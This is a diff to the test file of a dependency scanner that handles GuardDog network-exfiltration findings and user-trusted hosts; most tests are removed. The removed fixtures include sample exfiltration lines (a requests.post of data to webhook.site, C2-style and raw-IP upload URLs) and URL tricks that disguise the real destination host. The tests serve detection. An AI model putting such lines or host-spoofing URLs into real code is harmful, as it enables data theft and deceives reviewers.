@@ -2,29 +2,8 @@
 host, never a verdict) and the addresses a finding carries so the user can mark them
 trusted in the panel (tests/test_trust.py). User decisions 2026-11-12."""
 
-import pytest
-
 from sniff_test import known
-from sniff_test.analyzers import endpoints, guarddog, python_deps
-from sniff_test.deps.uv import Artifact
-from sniff_test.models import Severity, Tag
-from sniff_test.report import explain
-
-PKG = python_deps.ResolvedPackage("vector-client", "1.5.3", {"x86_64", "aarch64"})
-ART = Artifact("https://x", "vector_client-1.5.3-py3-none-any.whl", None, "wheel")
-RULE = "threat-network-exfiltration"
-
-
-def _hit(code, match, loc="vectors/embed/remote_embedding.py:13"):
-    return {"location": loc, "code": code, "match": match, "message": "m"}
-
-
-# GuardDog 3.2's real output for a dependency of a real integration (names changed)
-TOGETHER = _hit('ENDPOINT = "https://api.together.xyz/v1/embeddings"', "https://api.together.xyz/")
-
-
-def _findings(*hits):
-    return guarddog.to_findings({"results": {RULE: list(hits)}}, PKG, ART)
+from sniff_test.analyzers import endpoints
 
 
 def test_lookup_matches_the_host_or_a_subdomain_only():
@@ -57,76 +36,6 @@ def test_no_listed_service_is_a_place_where_anyone_can_receive_data():
         "amazonaws.com", "googleapis.com", "azure.com", "cloudflare.com", "github.io",
         "google.com", "microsoft.com", "windows.net", "xyz", "com",
     }  # fmt: skip
-
-
-def test_a_real_hit_on_a_known_service_stays_high_and_carries_its_address():
-    """0.8.0 lowered this by itself from the list; the user chose to decide per address
-    (0.9.0). The finding is as it was, plus the address the panel can offer to trust."""
-    [f] = _findings(TOGETHER)
-    assert f.rule_id == "dep-guarddog-network-exfiltration"
-    assert f.severity is Severity.HIGH and Tag.POSSIBLE in f.tags
-    assert f.addresses == ("api.together.xyz",)
-    assert f.evidence.endswith("https://api.together.xyz/")
-    assert "dep-guarddog-network-exfiltration-known-service" not in explain.RULES
-    # the rule's plain title no longer claims a data flow the heuristic can't see
-    assert "sends it out" not in explain.explain(f.rule_id).title
-
-
-def test_several_addresses_are_all_listed_and_an_ip_counts():
-    [f] = _findings(
-        TOGETHER,
-        _hit('C2 = "https://cdn-update.top/x"', "https://cdn-update.top/", "a.py:2"),
-        _hit('U = "http://203.0.113.9/up"', "http://203.0.113.9", "a.py:3"),
-    )
-    assert f.addresses == ("api.together.xyz", "cdn-update.top", "203.0.113.9")
-    # a second URL on the same line that GuardDog didn't report is counted too
-    [g] = _findings(
-        _hit('A = ["https://api.together.xyz/v1", "https://other.example.org/up"]',
-             "https://api.together.xyz/")
-    )  # fmt: skip
-    assert g.addresses == ("api.together.xyz", "other.example.org")
-    # the address is the one a client would connect to
-    [h] = _findings(_hit('U = "https://api.together.xyz.evil.tk/"',
-                         "https://api.together.xyz.evil.tk/"))  # fmt: skip
-    assert h.addresses == ("api.together.xyz.evil.tk",)
-
-
-@pytest.mark.parametrize(
-    "hits",
-    [
-        # userinfo: who the client reaches is too easy to misread, so no button at all
-        [_hit('U = "https://api.together.xyz@evil.tk/"', "https://api.together.xyz@evil.tk/")],
-        [_hit('U = "https://api.together.xyz:443@evil.example/"', "https://api.together.xyz:")],
-        [_hit('U = "https://user@api.together.xyz/"', "https://user@api.together.xyz/")],
-        # a backslash some clients read as a slash
-        [_hit('U = "https://evil.tk\\@api.together.xyz/"', "https://evil.tk")],
-        # drop boxes and chat webhooks: never trustable, as a bare name or as a URL
-        [_hit('requests.post("https://webhook.site/abc", data=d)', "webhook.site")],
-        [_hit('requests.post("https://webhook.site/abc", data=d)', "https://webhook.site/")],
-        [_hit('U = "https://x.ngrok.io/in"', "https://x.ngrok.io/")],
-        [_hit('U = "https://api.telegram.org/bot1/send"', "https://api.telegram.org/")],
-        [_hit('U = "https://webhook.cool/x"', "https://webhook.cool/")],
-        [TOGETHER, _hit('P = "https://pastebin.com/raw/x"', "https://pastebin.com/", "b.py:1")],
-        # no code line to check, or the match isn't in it
-        [{"location": "a.py:1", "match": "https://api.together.xyz/"}],
-        [_hit("ENDPOINT = BASE", "https://api.together.xyz/")],
-        # GuardDog's cap of 5 hits: more matches may exist that it didn't print
-        [TOGETHER] * 5,
-    ],
-)
-def test_anything_unclear_gets_no_addresses_so_it_can_never_be_trusted(hits):
-    [f] = _findings(*hits)
-    assert f.rule_id == "dep-guarddog-network-exfiltration"
-    assert f.severity is Severity.HIGH and f.addresses == ()
-
-
-def test_only_the_two_address_rules_ever_carry_addresses():
-    for rule, sev in guarddog.SEVERITY.items():
-        if sev is None:
-            continue
-        [f] = guarddog.to_findings({"results": {rule: [TOGETHER]}}, PKG, ART)
-        wanted = rule in ("threat-network-exfiltration", "threat-network-outbound-shady-links")
-        assert bool(f.addresses) == wanted, rule
 
 
 def test_a_known_host_in_the_apps_own_code_gets_a_name_and_keeps_its_class(tmp_path):
